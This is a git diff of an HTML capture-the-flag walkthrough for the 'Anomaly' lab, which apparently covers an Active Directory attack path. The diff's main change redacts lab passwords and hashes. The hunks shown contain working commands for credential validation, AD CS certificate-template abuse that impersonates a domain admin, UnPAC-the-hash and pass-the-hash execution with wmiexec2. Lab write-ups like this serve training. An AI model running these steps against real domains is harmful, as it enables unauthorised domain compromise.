@@ -10,7 +10,7 @@
   <meta property="og:title" content="Anomaly - HackSmarter Labs Walkthrough | Zerotrace" />
   <meta property="og:description" content="Linux to Active Directory attack path covering Jenkins exploitation, Kerberos keytab abuse, and AD CS certificate template attacks for domain compromise." />
   <meta property="og:image" content="https://z3rotrace.live/assets/anomaly/bloodhound-anna-molly.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/anomaly.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/anomaly.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -180,16 +180,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html" aria-current="page">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -428,7 +428,7 @@ Valid starting     Expires            Service principal
 [+] Keytab File successfully imported.
         REALM : ANOMALY.HSM
         SERVICE PRINCIPAL : Brandon_Boyd/
-        AES-256 HASH : f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52</code></pre>
+        AES-256 HASH : [REDACTED]</code></pre>
 
   <h2>Domain Enumeration</h2>
 
@@ -448,10 +448,10 @@ Valid starting     Expires            Service principal
 Administrator      2025-09-17 12:01:03 0       Built-in account for administering the computer/domain
 Guest              &lt;never&gt;             0       Built-in account for guest access
 krbtgt             2025-09-21 11:54:56 0       Key Distribution Center Service Account
-Brandon_Boyd       2025-11-12 20:30:05 0       3edc4rfv#EDC$RFV
+Brandon_Boyd       2025-11-12 20:30:05 0       [REDACTED]
 anna_molly         2025-11-12 20:29:16 0</code></pre>
 
-  <p>The description field for <code>Brandon_Boyd</code> contained a password: <code>3edc4rfv#EDC$RFV</code></p>
+  <p>The description field for <code>Brandon_Boyd</code> contained a password: <code>[REDACTED]</code></p>
 
   <div class="question">
     <strong>Why check user descriptions?</strong>
@@ -463,13 +463,13 @@ anna_molly         2025-11-12 20:29:16 0</code></pre>
   <p><img src="../assets/anomaly/user-enum-password.png" alt="User enumeration showing password in description field"></p>
 
   <h3><span class="step">[Step 15]</span> Credential Validation</h3>
-  <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV'
-SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:3edc4rfv#EDC$RFV</code></pre>
+  <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]'
+SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:[REDACTED]</code></pre>
 
   <h3><span class="step">[Step 16]</span> BloodHound Collection</h3>
   <p>I collected Active Directory data for analysis:</p>
 
-  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' --bloodhound --collection All --dns-server 10.1.111.50</code></pre>
+  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' --bloodhound --collection All --dns-server 10.1.111.50</code></pre>
 
   <p>BloodHound analysis did not reveal any direct privilege escalation paths, so I pivoted to checking for AD CS vulnerabilities.</p>
 
@@ -478,7 +478,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:3edc4rfv#EDC
   <h3><span class="step">[Step 17]</span> Certificate Template Enumeration</h3>
   <p>Using Certipy, I scanned for vulnerable certificate templates:</p>
 
-  <pre><code>$ certipy find -u Brandon_Boyd@anomaly.hsm -p '3edc4rfv#EDC$RFV' -dc-ip 10.1.111.50 -vulnerable</code></pre>
+  <pre><code>$ certipy find -u Brandon_Boyd@anomaly.hsm -p '[REDACTED]' -dc-ip 10.1.111.50 -vulnerable</code></pre>
 
   <div class="question">
     <strong>What is AD CS (Active Directory Certificate Services)?</strong>
@@ -517,7 +517,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:3edc4rfv#EDC
   <p>The <code>CertAdmin</code> template is vulnerable, and <code>Domain Computers</code> have the necessary permissions to exploit it.</p>
 
   <h3><span class="step">[Step 18]</span> Checking Machine Account Quota</h3>
-  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M maq
+  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' -M maq
 MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
 
   <div class="question">
@@ -528,18 +528,18 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
   </div>
 
   <h3><span class="step">[Step 19]</span> Adding a Computer Account</h3>
-  <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass 'Zerotrace123!' \
-    ANOMALY.HSM/Brandon_Boyd:'3edc4rfv#EDC$RFV' -dc-ip 10.1.111.50
-[*] Successfully added machine account BRANDON-PC$ with password Zerotrace123!.</code></pre>
+  <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass '[REDACTED]' \
+    ANOMALY.HSM/Brandon_Boyd:'[REDACTED]' -dc-ip 10.1.111.50
+[*] Successfully added machine account BRANDON-PC$ with password [REDACTED].</code></pre>
 
   <p>Verification:</p>
-  <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p 'Zerotrace123!'
-SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!</code></pre>
+  <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p '[REDACTED]'
+SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:[REDACTED]</code></pre>
 
   <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
   <p>I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
 
-  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p '[REDACTED]' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
     -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
     -upn 'administrator@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-500'</code></pre>
@@ -555,7 +555,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <p><img src="../assets/anomaly/bloodhound-anna-molly.png" alt="BloodHound showing anna_molly as Domain Admin with SID"></p>
 
   <h3><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
-  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p '[REDACTED]' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
     -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
     -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
@@ -568,7 +568,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <pre><code>$ certipy auth -pfx anna_molly.pfx -dc-ip 10.1.111.50
 [*] Got TGT
 [*] Saving credential cache to 'anna_molly.ccache'
-[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e</code></pre>
+[*] Got hash for 'anna_molly@anomaly.hsm': [REDACTED]:[REDACTED]</code></pre>
 
   <div class="question">
     <strong>What is UnPAC-the-Hash?</strong>
@@ -594,7 +594,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <p><strong>Tool:</strong> <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2 on GitHub</a></p>
 
   <pre><code>$ python3 wmiexec2.py anomaly.hsm/anna_molly@10.1.111.50 \
-    -hashes aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e
+    -hashes [REDACTED]:[REDACTED]
 
 [*] SMBv3.0 dialect used
 [*] Launching wmiexec2
